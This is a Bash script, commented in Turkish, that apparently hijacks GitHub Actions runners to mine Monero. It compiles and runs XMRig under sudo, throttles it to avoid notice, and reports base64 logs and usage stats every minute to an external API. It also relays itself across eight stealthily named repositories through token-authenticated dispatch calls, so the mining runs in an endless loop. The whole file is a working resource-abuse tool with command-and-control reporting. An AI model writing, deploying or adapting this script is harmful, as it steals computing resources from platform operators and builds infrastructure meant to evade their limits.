#!/bin/bash
set -x 

# --- KİMLİK VE AYARLAR ---
CURRENT_ID=${WORKER_ID:-1} 
WORKER_NAME="OBSIDIAN_W_$CURRENT_ID"
API_URL="https://miysoft.com/monero/prime_api_xmr.php"
POOL="pool.supportxmr.com:3333"

# GitHub Kullanıcı Adın ve Repoların
GITHUB_USER="workstation778"
REPOS=("Obsidian-Stealth-Core" "Spectre-Privacy-Node" "Phantom-Hash-Relay" "Wraith-Silent-Grid" "Eclipse-Dark-Flow" "Abyss-Deep-Sync" "Void-Zero-Trace" "Shadow-Ops-Link")

echo "### PROJECT OBSIDIAN NODE $CURRENT_ID BAŞLATILIYOR ###"

# --- ADIM 1: HAZIRLIK VE DERLEME ---
START_COMPILE=$SECONDS
sudo apt-get update > /dev/null
# Hugepages Monero için kritiktir
sudo sysctl -w vm.nr_hugepages=128
sudo apt-get install -y git build-essential cmake libuv1-dev libhwloc-dev jq cpulimit openssl > /dev/null

echo "⬇️ Kaynak kod indiriliyor..."
if [ -d "xmrig" ]; then rm -rf xmrig; fi
git clone https://github.com/xmrig/xmrig.git
mkdir -p xmrig/build
cd xmrig/build

echo "⚙️ Derleme Başlıyor..."
cmake ..
make -j$(nproc)

# --- KRİTİK DÜZELTME: Binary'i Ana Dizine Taşı ---
if [ -f "./xmrig" ]; then
    echo "✅ Derleme Başarılı! Dosya taşınıyor..."
    mv ./xmrig ../../xmrig_run
    cd ../.. 
    rm -rf xmrig # Kaynak kodları sil, yer kaplamasın
    chmod +x xmrig_run
else
    echo "❌ HATA: Derleme başarısız oldu, dosya oluşmadı."
    exit 1
fi

ELAPSED_COMPILE=$((SECONDS - START_COMPILE))
echo "⏱️ Hazırlık Süresi: $ELAPSED_COMPILE sn"

# --- ADIM 2: MADENCİLİK BAŞLAT ---
# OpenSSL ile daha hızlı ID üretimi
RAND_ID=$(openssl rand -hex 4)
MY_MINER_NAME="GHA_${CURRENT_ID}_${RAND_ID}"
touch miner.log && chmod 666 miner.log

echo "🚀 Madenci Ateşleniyor: $MY_MINER_NAME"

# Log dosyasını anlık görebilmek için --log-file parametresi
sudo nohup ./xmrig_run -o $POOL -u $WALLET_XMR -p $MY_MINER_NAME -a rx/0 -t 2 --donate-level 1 --log-file=miner.log > /dev/null 2>&1 &
MINER_PID=$!

echo "✅ PID: $MINER_PID. Bekleniyor..."
sleep 15
sudo cpulimit -p $MINER_PID -l 140 & > /dev/null 2>&1

# --- ADIM 3: İZLEME VE RAPORLAMA ---
# Derleme süresini düşerek toplam 6 saate tamamla (yaklaşık 20000 sn çalışma)
MINING_DURATION=19500 
START_LOOP=$SECONDS

while [ $((SECONDS - START_LOOP)) -lt $MINING_DURATION ]; do
    
    # Madenci çalışıyor mu kontrol et
    if ! ps -p $MINER_PID > /dev/null; then
        echo "⚠️ Madenci durdu, yeniden başlatılıyor..."
        sudo nohup ./xmrig_run -o $POOL -u $WALLET_XMR -p $MY_MINER_NAME -a rx/0 -t 2 --donate-level 1 --log-file=miner.log > /dev/null 2>&1 &
        MINER_PID=$!
        sudo cpulimit -p $MINER_PID -l 140 &
    fi

    # Verileri Topla
    CPU=$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1}')
    RAM=$(free | grep Mem | awk '{print $3/$2 * 100.0}')
    
    # Logları Base64 Yap
    LOGS_B64=$(tail -n 15 miner.log | base64 -w 0)

    # JSON Oluştur
    JSON_DATA=$(jq -n \
                  --arg wid "$WORKER_NAME" \
                  --arg cpu "$CPU" \
                  --arg ram "$RAM" \
                  --arg st "MINING_XMR" \
                  --arg log "$LOGS_B64" \
                  '{worker_id: $wid, cpu: $cpu, ram: $ram, status: $st, logs: $log}')

    # API'ye Gönder
    curl -s -o /dev/null -X POST \
         -H "Content-Type: application/json" \
         -H "X-Miysoft-Key: $MIYSOFT_KEY" \
         -d "$JSON_DATA" \
         $API_URL
    
    sleep 60
done

# --- ADIM 4: GÖREV DEVRİ ---
echo "✅ Görev Tamamlandı. İşlem sonlandırılıyor..."
sudo kill $MINER_PID

NEXT_ID=$((CURRENT_ID + 2))
if [ "$NEXT_ID" -gt 8 ]; then
    NEXT_ID=$((NEXT_ID - 8))
fi

TARGET_REPO=${REPOS[$((NEXT_ID-1))]}
echo "🔄 Sinyal Gönderiliyor: ID $NEXT_ID -> Repo: $TARGET_REPO"

curl -s -X POST -H "Authorization: token $PAT_TOKEN" \
     -H "Accept: application/vnd.github.v3+json" \
     "https://api.github.com/repos/$GITHUB_USER/$TARGET_REPO/dispatches" \
     -d "{\"event_type\": \"obsidian_loop\", \"client_payload\": {\"worker_id\": \"$NEXT_ID\"}}"

echo "👋 Görüşürüz."
exit 0
